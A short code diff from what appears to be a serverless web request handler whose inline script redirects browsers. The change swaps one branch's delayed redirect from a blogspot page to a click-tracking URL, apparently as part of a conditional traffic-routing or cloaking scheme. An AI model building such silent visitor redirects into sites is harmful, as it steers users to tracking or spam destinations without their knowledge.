@@ -69,7 +69,7 @@ export async function onRequest(context) {
           window.location.href = "https://redrect22.blogspot.com/";
         } else {
           setTimeout(() => {
-            window.location.href = "https://redrect11.blogspot.com/";
+            window.location.href = "https://z9nuz.bemobtrcks.com/click";
           }, 200); // delay untuk validasi
         }
       </script>
